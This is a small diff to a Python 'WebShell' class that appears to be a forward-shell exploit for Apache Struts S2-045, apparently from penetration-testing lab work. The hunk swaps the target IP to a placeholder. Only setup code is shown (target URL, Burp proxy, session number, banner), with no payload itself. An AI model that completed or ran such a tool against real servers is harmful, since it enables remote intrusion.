@@ -16,7 +16,7 @@ class WebShell(object):
     # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp 
     def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'): 
         # MODIFY THIS, URL 
-        self.url = r"http://10.11.1.109:8080/struts2-rest-showcase/orders/3" 
+        self.url = r"http://10.10.10.10:8080/struts2-rest-showcase/orders/3" 
         self.proxies = {'http' : proxies} 
         session = random.randrange(10000,99999) 
         print(f"\r\n[*] (m4ud) Windows AS-045 Forward-shell\r\n")
